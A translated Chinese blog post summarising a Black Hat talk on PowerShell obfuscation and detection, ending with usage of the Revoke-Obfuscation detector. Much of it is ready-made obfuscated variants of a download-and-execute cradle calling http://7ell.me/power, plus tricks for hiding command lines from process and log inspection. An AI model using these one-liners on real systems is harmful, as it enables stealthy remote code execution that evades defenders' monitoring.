> 原文链接: https://www.anquanke.com//post/id/86637 


# 【技术分享】根据powershell语言的特性来混淆代码的方法与原理


                                阅读量   
                                **192842**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：blackhat.com
                                <br>原文地址：[https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science.pdf)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](https://p1.ssl.qhimg.com/t01f62042c7543dacb9.png)](http://p2.qhimg.com/t01136e71dcb6ed8569.png)

译者：[七三](http://bobao.360.cn/member/contribute?uid=1252619100)

预估稿费：120RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**简介**

大多数攻击者目前已经将PowerShell 利用在了各种攻击场景中，如内网渗透，APT攻击甚至包括现在流行的勒索软件中。powershell的功能强大且调用方式十分灵活。在今年的2017 blackhat大会上，有一个关于powershell的议题（地址：us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science），主要就是讲了powershell的混淆与检测。在看完作者的PPT后，真觉得干货颇多，想来做做笔记记录一下。

这篇笔记就来详细介绍一下根据powershell语言的特性来混淆代码的方法与原理。

<br>

**1. cmd启动powershell**

首先看看powershel使用cmd.exe启动执行代码的方式：

**1.1 常规方法**



```
cmd.exe /c "powershell -c Write-Host SUCCESS -Fore Green"
cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
cmd /c "set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -"
```

**1.2 管道输入流**

```
cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
```

**1.3 利用环境变量**



```
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd"
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable('cmd', 'Process'))
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)
```

在父进程中隐藏运行的代码：上面第二种方式运行时，如果使用进程查看，可以在父进程启动参数中cmd.exe /c "set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -,看到你执行的代码，因为此时powershell -的父进程时第一个cmd.exe，所以可以使用cmd中的转义符号^将|转义后，如

cmd.exe /c "set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%^|powershell -,第二个cmd后面对命令行来说是一个整体，然后执行cmd /c echo %cmd%|powershell -,此时powershell -的父进程就是第二个cmd了，看不到我们执行的代码了。

**1.4 从其他进程获取参数**

首先启动多个cmd进程，这些进程参数中包含要执行的代码

```
cmd /c "title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo"
```

然后在powershell中提取出来IEX (IWR https://7ell.me/power)执行，如：

```
cmd /c "powershell IEX (Get-WmiObject Win32_Process -Filter ^"Name = 'cmd.exe' AND CommandLine like '%WINDOWS_DEFENDER_UPDATE%'^").CommandLine.Split([char]38)[2].SubString(5)"
```

**1.5 从粘贴板**

```
cmd.exe /c "echo Write-Host CLIP -Fore Green | clip&amp;&amp; powershell [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); IEX ([System.Windows.Forms.Clipboard]::GetText())"
```

这些方法可以在powershell日志中看到，所以开启powershell的日志分析很重要。

但是，如果时混淆的，日志中也仅仅是记录了混淆后的东西。

<br>

**2. 混淆**

Hacker在攻击时经常会远程下载代码脚本执行，这里基于这样的一条标准的下载文件命令来进行变形混淆。

```
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://7ell.me/power")。
```

在混淆之前，先看看powershell获取环境变量的方式。

```
Get-Variable/GV/Variable cmd -ValueOnly
```

-ValueOnly可以简写为-ValueOnly,-ValueOnl,-ValueOn,-ValueO……,-Va,-V



```
(Get-Item/GI/Item Variable:cmd).Value
(Get-ChildItem/GCI/ChildItem/DIR/LS Variable:cmd).Value
```

后面很多构造会用到这些方式的。

**2.0 简单处理**

```
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://7ell.me/power")
```

可以去掉System

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://7ell.me/power")
```

将http分开+号连接

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("ht"+"tp://7ell.me/power")
```

变量代替

```
IEX $wc=New-Object Net.WebClient;$wc.DownloadString('h'+'ttp://7ell.me/power')
```

把downloadstring使用单双引号引起来

```
Invoke-Expression (New-Object Net.WebClient)."DownloadString"('h'+'ttp://7ell.me/power')
```

使用invoke方法



```
Invoke-Expression (New-Object Net.WebClient).("DownloadString").Invoke('h'+'ttp://7ell.me/power')
$ds="Down"+"loadString";Invoke-Expression (New-Object Net.WebClient).$ds.Invoke('h'+'ttp://7ell.me/power')
```

以上单双引号可以切换

**2.1 转义符(反引号)**

查看帮助Get-Help about_Escape_Characters

以下为 Windows PowerShell 能够识别的特殊字符：



```
0     Null
    `a    警报
    `b    退格
    `f    换页
    `n    换行
    `r    回车
    `t    水平制表
    `v    垂直制表
```

转义符号加在其他字符前不影响字符的意思，避免在0,a,b,f,n,r,t,v的小写字母前出现即可。



```
Invoke-Expression (New-Object Net.WebClient)."Down`loadString"('h'+'ttp://7ell.me/power')
Invoke-Expression (New-Object Net.WebClient)."D`o`wn`l`oad`Str`in`g"('h'+'ttp://7ell.me/power') 
Invoke-Expression (New-Object Net.WebClient)."D`o`w`N`l`o`A`d`S`T`R`in`g"('h'+'ttp://7ell.me/power')
```

同样可以使用在Net.Webclient上

```
Invoke-Expression (New-Object "`Ne`T.`Web`Cli`ent")."Down`l`oadString"('h'+'ttp://7ell.me/power')
```

括号代替空格，或者多个定义变量来连接替换



```
Invoke-Expression (New-Object("`Ne`T.`Web`Cli`ent"))."Down`l`oadString"('h'+'ttp://7ell.me/power')
$v1="Net.";$v2="WebClient";Invoke-Expression (New-Object $v1$v2)."Down`l`oadString"('h'+'ttp://7ell.me/power')
```

**2.2 简写与通配符***

e.g Get-Comamd New-Ob*

以下几种处理都可以代替 Get-Command New-Object ; Get-Comamnd 可简写为 GCM



```
&amp;(Get-Command New-Obje*)     &amp;(Get-Command *w-O*)     &amp;(GCM *w-O*)     &amp;(COMMAND *w-*ct)
.(Get-Command New-Obje*)     .(Get-Command *w-O*)     .(GCM *w-O*)     .(COMMAND *w-*ct)
$var1="New";$var2="-Object";$var3=$var1+$var2;&amp;(GCM $var3)
```

结合其他方法混淆



```
Invoke-Expression (&amp;(Get-Command New-Obje*)"Net.WebClient")."DownloadString"('h'+'ttp://7ell.me/power')
$var1="New";$var2="-Object";$var3=$var1+$var2;Invoke-Expression (&amp;(GCM $var3)"Net.WebClient")."DownloadString"('h'+'ttp://7ell.me/power')
ie`x (.(GCM *w-O*)"Net.WebClient")."DownloadString"('h'+'ttp://7ell.me/power')
```

**2.3 脚本块**

使用脚本块 



```
invoke-command`{`xxxx`}`   ICM`{`xxxx`}`   `{`xxxx`}`.invoke()    &amp;`{`xxxx`}`    .`{`xxxx`}`
$ExecutionContext.InvokeCommand.NewScriptBlock("xxxxx")
$`{`ExecuTioNCoNTexT`}`."INVokeCommANd"."NewScRipTBlock"("expression")
$ExecutionContext."`I`N`V`o`k`e`C`o`m`m`A`N`d"."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("expression") 
$`{``E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T`}`."`I`N`V`o`k`e`C`o`m`m`A`N`d"."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("expression") 
$a = $`{``E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T`}`; $b = $a."`I`N`V`o`k`e`C`o`m`m`A`N`d";$b."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("ex"+"pres"+"sion")
```



Scriptblock类方法,[Scriptblock]相当于[Type]("Scriptblock")

```
[Scriptblock]::Create("expression")
([Type]"Scriptblock")::create('expression')
[Scriptblock]::("Create").Invoke("expression")
([Type]("Scriptblock"))::("Create").Invoke("expression")
[Scriptblock]::("`C`R`e"+"`A`T`e").Invoke("expression") 
([Type]("Scr"+"ipt"+"block"))::("`C`R`e"+"`A`T`e").Invoke("ex"+"pres"+"sion")
```

可以构造出下面的式子混淆<br>

```
.($`{``E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T`}`."`I`N`V`o`k`e`C`o`m`m`A`N`d")."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"((&amp; (`G`C`M *w-O*)"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('h'+'ttp://7ell.me/power'))
```

**2.4 字符串处理**

反转



```
$reverseCmd= ")'rewop/em.lle7//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(";
1. IEX ($reverseCmd[-1..-($reverseCmd.Length)] -Join '') | IEX
2. $reverseCmdCharArray= $reverseCmd.ToCharArray(); [Array]::Reverse($reverseCmdCharArray); IEX ($reverseCmdCharArray-Join '') | IEX
3. IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX
```

分割截断 or 替换字符



```
$cmdWithDelim= "(New-Object Net.We~~bClient).Downlo~~adString('http://7ell.me/power')";
1. IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
2. IEX $cmdWithDelim.Replace("~~","") | IEX
3. IEX ($cmdWithDelim-Replace "~~","") | IEX
```

格式填充，-f 格式化。



```
//将NE download http://分别填到`{`0`}`,`{`1`}`,`{`2`}`
IEX ('(`{`0`}`w-Object `{`0`}`t.WebClient).`{`1`}`String("`{`2`}`7ell.me/power")' -f 'Ne', 'Download','http://') | IEX 
//示例2
.("`{`1`}``{`0`}`" -f 'X','IE') (&amp;("`{`3`}``{`2`}``{`1`}``{`0`}`" -f 'ct','-Obje','w','Ne') ("`{`0`}``{`2`}``{`1`}`" -f 'N','nt','et.WebClie')).("`{`2`}``{`0`}``{`1`}``{`3`}`" -f 'dSt','rin','Downloa','g').Invoke(("`{`5`}``{`0`}``{`3`}``{`4`}``{`1`}``{`2`}`" -f 'tp:/','o','wer','/','7ell.me/p','ht'))
```

变量拼接



```
$c1="(New-Object Net.We"; $c2="bClient).Downlo"; $c3="adString('http://7ell.me/power')";
1. IEX ($c1,$c2,$c3 -Join '') | IEX
2. IEX ($c1,$c3 -Join $c2) | IEX
3. IEX ([string]::Join($c2,$c1,$c3)) | IEX
4. IEX ([string]::Concat($c1,$c2,$c3)) | IEX
5. IEX ($c1+$c2+$c3) | IEX 
6. IEX "$c1$c2$c3" | IEX
```

**2.5 编码**

Ascii

使用[char]xx 代替字符 如：[char]59–&gt;;



```
//不用分号
$cmd= "$c1~~$c2~~$c3~~$c4"; IEX $cmd.Replace("~~",[string]([char]59)) | IEX
```

Base64

命令行参数使用

```
-EC,-EncodedCommand,-EncodedComman,-EncodedComma,-EncodedComm,......,Enc,-En,E
```

解码echo 123 的base64  ZQBjAGgAbwAgADEAMgAzAAoA



```
1.PS 2.0 -&gt;  [C`onv`ert]::"FromB`Ase6`4Str`ing"('ZQBjAGgAbwAgADEAMgAzAAoA')
2.PS 3.0+ -&gt; [ &lt;##&gt; Convert &lt;##&gt; ]:: &lt;##&gt; "FromB`Ase6`4Str`ing"('ZQBjAGgAbwAgADEAMgAzAAoA')
```

.NET的方法

```
IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ZQBjAGgAbwAgADEAMgAzAAoA')))
```

其他不同的方式编码 hex/octal/binary/BXOR/etc.



```
[Convert]::ToString(1234, 2)
[Convert]::ToString(1234, 8)
[Convert]::ToString(1234, 16)
```

也是转换为16进制



```
"`{`0:X4`}`" -f 1234  小写： "`{`0:x4`}`" -f 1234
[Byte][Char]([Convert]::ToInt16($_,16)) 
($cmd.ToCharArray() | % `{`[int]$_`}`) -Join $delim   //可以去掉空白 -Join$delim
$bytes[$i] = $bytes[$i] -BXOR 0x6A                //可以去点空白  $bytes[$i]-BXOR0x6A)
```

**SecureString**

关于SecureString: Get-Comamnd *secure-string*



```
https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/
 https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-2/
$secPwd= Read-Host "Enter password" -AsSecureString
$secPwd= "echo 123" | ConvertTo-SecureString -AsPlainText -Force
$secPwd| ConvertFrom-SecureString
```

加密指定key



```
$cmd= "code"
$secCmd= ConvertTo-SecureString $cmd -AsPlainText -Force
$secCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)
$secCmdPlaintext
```

解密

```
echo xxxx| ConvertTo-SecureString -Key (1..16)
```

示例



```
$cmd= "echo 123"
$secCmd= ConvertTo-SecureString $cmd -AsPlainText -Force
$secCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)
```

运行

```
$secCmd= $secCmdPlaintext| ConvertTo-SecureString -Key (1..16);([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX
```

**2.6 自构造关键字替换**

就是在其他命令的输出下查看观察目标字符串位置，然后提取出来。比如DownlaodString的构造替换



```
DownloadString == (((New-Object Net.WebClient).PsObject.Methods | Where-Object `{`$_.Name -like '*wn*d*g'`}`).Name)
IEX (New-Object Net.WebClient).(((New-Object Net.WebClient).PsObject.Methods | Where-Object `{`$_.Name -like '*wn*d*g'`}`).Name).Invoke('http://7ell.me/power')
```

再结合get-command的变形

```
IEX (.(COMMAND *w-*ct) Net.WebClient).(((.(COMMAND *w-*ct) Net.WebClient).PsObject.Methods | Where-Object `{`$_.Name -like '*wn*d*g'`}`).Name).Invoke('http://7ell.me/power')
```

根据这样的思路结合上面提到的获取环境变量方法，可以把New-Object层层混淆为 

```
(GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).(((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).PsObject.Methods|Where`{`(GCI Variable:_).Value.Name-ilike'*Co*d'`}`).Name).Invoke((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).(((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name)|GM|Where`{`(GCI Variable:_).Value.Name-ilike'G*om*e'`}`).Name).Invoke('N*ct',$TRUE,1), [System.Management.Automation.CommandTypes]::Cmdlet)
```



**3. IEX 的处理与其他执行方法**

经过上面构造可以看到很多都使用Invoke-Expression/IEX命令，.，&amp;符号来执行表达式。

Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。

这里也先看看代替IEX的各种执行方式

Get-Alias/GAL



```
&amp;(GAL I*X)
.(LS Alias:/I*X)
Get-Command/GCM
.(GCM I*e-E*)
&amp;(Command I*e-E*)
```



GetCmdlets (PS1.0+),

```
$ExecutionContext.InvokeCommand.GetCmdlets('I*e-E*'),
//用到环境变量
&amp;(GV E*Cont* -Va).InvokeCommand.(((GV E*Cont* -Va).InvokeCommand.PsObject.Methods|Where`{`(GV _ -Va).Name -clike'*Cm*ts'`}`).Name).Invoke('I*e-E*')
```

InvokeScript (PS1.0+)

```
$ExecutionContext.InvokeCommand.InvokeScript($Script)
(GV E*Cont* -Va).InvokeCommand.(((GV E*Cont* -Va).InvokeCommand.PsObject.Methods|Where`{`(GV _ -Va).Name -clike'I*'`}`).Name).Invoke($Script),
```

Invoke-Command/ICM

```
Invoke-Command ([ScriptBlock]::Create($Script))
[ScriptBlock]::Create($Script).Invoke()
.((GV *cut*t -Va).(((GV *cut*t -Va)|Member)[6].Name).(((GV *cut*t -Va).(((GV *cut*t -Va)|Member)[6].Name)|Member|Where-Object`{`(Get-Variable _ -Va).Name-clike'N*S*B*'`}`).Name).Invoke($Script))
```

PS Runspace

```
[PowerShell]::Create().AddScript($Script).Invoke()
Invoke-AsWorkflow (PS3.0+)
Invoke-AsWorkflow -Expression $Script
```

提取串联出IEX，也是在其他命令的输出下查看观察目标字符串位置，然后提取出来。



```
($Env:ComSpec[4,26,25]-Join'')
((LS env:/Co*pec).Value[4,26,25]-Join'')
($ShellId[1]+$ShellId[13]+'x')
((GV S*ell*d -Va)[1]+(DIR Variable:S*ell*d).Value[13]+'x')
( ([String]''.IndexOf)[0,7,8]-Join'')
//怎么构造?，比如上面这个 首先查看''|Get-Member有个IndexOf方法，然后看看[String]''.IndexOf的输出，提取出里面的IEX字母
```



**4. 相关工具**

**4.1 Invoke-Obfuscation**

这是一个powershell混淆编码框架，基本涵盖了上述的各种混淆方法，

地址：Invoke-Obfuscation

使用方法：[http://www.freebuf.com/sectool/136328.html](http://www.freebuf.com/sectool/136328.html) 

**4.2 Revoke-Obfuscation**

这是一个powershell混淆检测框架，该工具能给出一个脚本是否混淆的

地址：Revoke-Obfuscation

使用方法



```
//初始
Import-Module .Revoke-Obfuscation.psm1 -Verbose
//gte-filehash没有输入流参数，自己下载一个get-filehash导入即可
//还有个问题 使用-OutputToDisk输出时，Set-Content没有NoNewline参数，ps5.0没问题。
//检测每一行的混淆情况
Get-Content .test.txt|Measure-RvoObfuscation -Verbose -OutputToDisk
//检测一个文件是否混淆 
Get-ChildItem .test.txt|Measure-RvoObfuscation -Verbose -OutputToDisk
//远程检测
Measure-RvoObfuscation -Url 'http://bit.ly/DBOdemo1' -Verbose -OutputToDisk
Measure-RvoObfuscation -Url 'http://7ell.me/powershell/rev.ps1' -Verbose
//从事件了提取ID为4104的日志重组
Get-ChildItem .Demodemo.evtx | Get-RvoScriptBlock -Verbose
Get-RvoScriptBlock -Path 'C:WindowsSystem32WinevtLogsMicrosoft-Windows-PowerShell%4Operational.evtx' -Verbose
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Get-RvoScriptBlock -Verbose
Get-ChildItem C:MirOrHxAuditFiles*_w32eventlogs.xml | Get-RvoScriptBlock -Verbose
Get-CSEventLogEntry -LogName Microsoft-Windows-PowerShell/Operational | Get-RvoScriptBlock
//从事件日志中提取然后检测
$obfResults = Get-WinEvent -Path .Demodemo.evtx | Get-RvoScriptBlock | Measure-RvoObfuscation -OutputToDisk -Verbose
```

当使用上面的混淆框架Invoke-Obfuscation的个汇总混淆方法生成几个样本。

使用该工具进行检测测试

[![](https://p2.ssl.qhimg.com/t014068094fa670624b.png)](https://p2.ssl.qhimg.com/t014068094fa670624b.png)

批量检测结果              

[![](https://p0.ssl.qhimg.com/t0162bfd61cd3a4f9d8.png)](https://p0.ssl.qhimg.com/t0162bfd61cd3a4f9d8.png)
